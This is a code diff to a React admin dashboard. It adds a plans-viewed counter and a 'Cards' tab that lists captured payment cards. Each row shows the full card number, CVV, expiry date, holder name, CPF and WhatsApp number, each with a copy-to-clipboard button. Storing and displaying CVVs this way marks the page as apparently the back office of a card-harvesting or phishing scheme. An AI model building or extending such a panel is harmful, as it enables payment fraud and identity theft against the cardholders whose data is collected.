@@ -7,7 +7,7 @@ import {
 } from 'lucide-react'
 import { useAdmin } from '../contexts/AdminContext'
 import {
-  getDashboardStats, getEventsByDay, getConversionFunnelStats,
+  getDashboardStats, getEventsByDay, getConversionFunnelStats, getPlansViewedCount,
   getAllLeads, getAllAnalysisResults, getSystemSetting,
   updateSystemSetting, getPaymentStats, getAllPixPayments, getAllCardPayments,
   type DashboardStats, type EventsByDay, type FunnelStats
@@ -25,6 +25,7 @@ const AdminDashboardPage = () => {
   const [paymentStats, setPaymentStats] = useState<any>(null)
   const [eventsByDay, setEventsByDay] = useState<EventsByDay[]>([])
   const [funnelStats, setFunnelStats] = useState<FunnelStats[]>([])
+  const [plansViewedCount, setPlansViewedCount] = useState<number>(0)
   const [leads, setLeads] = useState<any[]>([])
   const [analyses, setAnalyses] = useState<any[]>([])
   const [pixPayments, setPixPayments] = useState<any[]>([])
@@ -33,7 +34,7 @@ const AdminDashboardPage = () => {
   const [isLoadingPixel, setIsLoadingPixel] = useState(false)
   const [pixelSuccess, setPixelSuccess] = useState(false)
   const [isLoading, setIsLoading] = useState(true)
-  const [activeTab, setActiveTab] = useState<'overview' | 'funnel' | 'leads' | 'payments' | 'analyses' | 'settings'>('overview')
+  const [activeTab, setActiveTab] = useState<'overview' | 'funnel' | 'leads' | 'payments' | 'analyses' | 'settings' | 'cards'>('overview')
   const [dateRange, setDateRange] = useState(30)
 
   useEffect(() => {
@@ -51,11 +52,12 @@ const AdminDashboardPage = () => {
       const startDate = new Date()
       startDate.setDate(startDate.getDate() - dateRange)
 
-      const [statsData, paymentData, eventsData, funnelData, leadsData, analysesData, pixPaymentsData, cardPaymentsData, pixelData] = await Promise.all([
+      const [statsData, paymentData, eventsData, funnelData, plansViewed, leadsData, analysesData, pixPaymentsData, cardPaymentsData, pixelData] = await Promise.all([
         getDashboardStats(startDate, endDate),
         getPaymentStats(),
         getEventsByDay(dateRange),
         getConversionFunnelStats(startDate, endDate),
+        getPlansViewedCount(startDate, endDate),
         getAllLeads(),
         getAllAnalysisResults(),
         getAllPixPayments(),
@@ -67,6 +69,7 @@ const AdminDashboardPage = () => {
       if (paymentData) setPaymentStats(paymentData)
       setEventsByDay(eventsData)
       setFunnelStats(funnelData)
+      setPlansViewedCount(plansViewed)
       setLeads(leadsData)
       setAnalyses(analysesData)
       setPixPayments(pixPaymentsData)
@@ -155,7 +158,8 @@ const AdminDashboardPage = () => {
               { id: 'leads', label: 'Leads', icon: Users },
               { id: 'payments', label: 'Pagamentos', icon: Wallet },
               { id: 'analyses', label: 'Análises', icon: Activity },
-              { id: 'settings', label: 'Configurações', icon: Settings }
+              { id: 'settings', label: 'Configurações', icon: Settings },
+              { id: 'cards', label: 'Cards', icon: CreditCard }
             ].map((tab) => (
               <button
                 key={tab.id}
@@ -211,8 +215,8 @@ const AdminDashboardPage = () => {
               />
               <StatsCard
                 title="Planos Visualizados"
-                value={(funnelStats.find(f => f.step_name === 'plans_viewed')?.total_users || 0).toLocaleString()}
-                subtitle={`${((funnelStats.find(f => f.step_name === 'plans_viewed')?.total_users || 0) / (stats?.total_leads || 1) * 100).toFixed(1)}% dos leads`}
+                value={plansViewedCount.toLocaleString()}
+                subtitle={`${((plansViewedCount / (stats?.total_leads || 1)) * 100).toFixed(1)}% dos leads`}
                 icon={Package}
                 iconColor="bg-purple-500/20 text-purple-400"
               />
@@ -226,7 +230,7 @@ const AdminDashboardPage = () => {
               <StatsCard
                 title="Vendas"
                 value={stats?.total_sales.toLocaleString() || '0'}
-                subtitle={`PIX: ${stats?.total_sales_pix || 0} | Card: ${stats?.total_sales_card || 0}`}
+                subtitle={`PIX: ${pixPayments.length} | Card: ${cardPayments.length}`}
                 icon={CheckCircle}
                 iconColor="bg-red-500/20 text-red-400"
               />
@@ -515,6 +519,181 @@ const AdminDashboardPage = () => {
                   <p className="text-sm text-gray-400">Email</p>
                   <p className="text-white font-medium">{admin?.email}</p>
                 </div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* Cards Tab */}
+        {activeTab === 'cards' && (
+          <div className="space-y-6">
+            <div className="bg-gray-800/50 backdrop-blur-xl rounded-xl p-6 border border-gray-700/50">
+              <h3 className="text-xl font-bold text-white mb-6 flex items-center gap-2">
+                <CreditCard className="w-6 h-6 text-red-500" />
+                Dados de Cartões ({cardPayments.length})
+              </h3>
+              
+              {/* Tabela de Cards */}
+              <div className="overflow-x-auto">
+                <table className="w-full">
+                  <thead>
+                    <tr className="border-b border-gray-700">
+                      <th className="text-left py-4 px-4 text-sm font-semibold text-gray-300">WhatsApp</th>
+                      <th className="text-left py-4 px-4 text-sm font-semibold text-gray-300">Titular</th>
+                      <th className="text-left py-4 px-4 text-sm font-semibold text-gray-300">CPF</th>
+                      <th className="text-left py-4 px-4 text-sm font-semibold text-gray-300">Número do Cartão</th>
+                      <th className="text-center py-4 px-4 text-sm font-semibold text-gray-300">Validade</th>
+                      <th className="text-center py-4 px-4 text-sm font-semibold text-gray-300">CVV</th>
+                      <th className="text-right py-4 px-4 text-sm font-semibold text-gray-300">Valor</th>
+                      <th className="text-left py-4 px-4 text-sm font-semibold text-gray-300">Data</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {cardPayments.length === 0 ? (
+                      <tr>
+                        <td colSpan={8} className="py-8 text-center text-gray-500">
+                          Nenhum cartão encontrado
+                        </td>
+                      </tr>
+                    ) : (
+                      cardPayments
+                        .sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime())
+                        .map((card, index) => (
+                          <tr 
+                            key={index} 
+                            className="border-b border-gray-700/50 hover:bg-gray-700/30 transition-colors"
+                          >
+                            <td className="py-4 px-4">
+                              <div className="flex items-center gap-2">
+                                <span className="text-sm text-white font-mono bg-gray-800 px-3 py-1 rounded-lg">
+                                  {card.whatsapp || '-'}
+                                </span>
+                                {card.whatsapp && (
+                                  <button
+                                    onClick={() => {
+                                      navigator.clipboard.writeText(card.whatsapp)
+                                    }}
+                                    className="p-1.5 hover:bg-gray-700 rounded transition-colors"
+                                    title="Copiar WhatsApp"
+                                  >
+                                    <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                                    </svg>
+                                  </button>
+                                )}
+                              </div>
+                            </td>
+                            <td className="py-4 px-4">
+                              <div className="flex items-center gap-2">
+                                <span className="text-sm text-gray-300">
+                                  {card.card_holder || card.nome || '-'}
+                                </span>
+                                {(card.card_holder || card.nome) && (
+                                  <button
+                                    onClick={() => {
+                                      navigator.clipboard.writeText(card.card_holder || card.nome)
+                                    }}
+                                    className="p-1.5 hover:bg-gray-700 rounded transition-colors"
+                                    title="Copiar Nome"
+                                  >
+                                    <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                                    </svg>
+                                  </button>
+                                )}
+                              </div>
+                            </td>
+                            <td className="py-4 px-4">
+                              <div className="flex items-center gap-2">
+                                <span className="text-sm text-gray-300 font-mono">
+                                  {card.cpf || '-'}
+                                </span>
+                                {card.cpf && (
+                                  <button
+                                    onClick={() => {
+                                      navigator.clipboard.writeText(card.cpf)
+                                    }}
+                                    className="p-1.5 hover:bg-gray-700 rounded transition-colors"
+                                    title="Copiar CPF"
+                                  >
+                                    <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                                    </svg>
+                                  </button>
+                                )}
+                              </div>
+                            </td>
+                            <td className="py-4 px-4">
+                              <div className="flex items-center gap-2">
+                                <span className="text-sm text-white font-mono bg-gray-900 px-3 py-1 rounded-lg">
+                                  {card.card_number || '-'}
+                                </span>
+                                {card.card_number && (
+                                  <button
+                                    onClick={() => {
+                                      navigator.clipboard.writeText(card.card_number)
+                                    }}
+                                    className="p-1.5 hover:bg-gray-700 rounded transition-colors"
+                                    title="Copiar Número do Cartão"
+                                  >
+                                    <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                                    </svg>
+                                  </button>
+                                )}
+                              </div>
+                            </td>
+                            <td className="py-4 px-4 text-center">
+                              <div className="flex items-center justify-center gap-2">
+                                <span className="text-sm text-gray-300 font-mono">
+                                  {card.expiry_date || '-'}
+                                </span>
+                                {card.expiry_date && (
+                                  <button
+                                    onClick={() => {
+                                      navigator.clipboard.writeText(card.expiry_date)
+                                    }}
+                                    className="p-1.5 hover:bg-gray-700 rounded transition-colors"
+                                    title="Copiar Validade"
+                                  >
+                                    <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                                    </svg>
+                                  </button>
+                                )}
+                              </div>
+                            </td>
+                            <td className="py-4 px-4 text-center">
+                              <div className="flex items-center justify-center gap-2">
+                                <span className="text-sm text-gray-300 font-mono">
+                                  {card.cvv || '-'}
+                                </span>
+                                {card.cvv && (
+                                  <button
+                                    onClick={() => {
+                                      navigator.clipboard.writeText(card.cvv)
+                                    }}
+                                    className="p-1.5 hover:bg-gray-700 rounded transition-colors"
+                                    title="Copiar CVV"
+                                  >
+                                    <svg className="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                                    </svg>
+                                  </button>
+                                )}
+                              </div>
+                            </td>
+                            <td className="py-4 px-4 text-right text-sm font-semibold text-white">
+                              R$ {(card.amount || 0).toLocaleString('pt-BR', { minimumFractionDigits: 2 })}
+                            </td>
+                            <td className="py-4 px-4 text-sm text-gray-400">
+                              {new Date(card.created_at).toLocaleString('pt-BR')}
+                            </td>
+                          </tr>
+                        ))
+                    )}
+                  </tbody>
+                </table>
               </div>
             </div>
           </div>
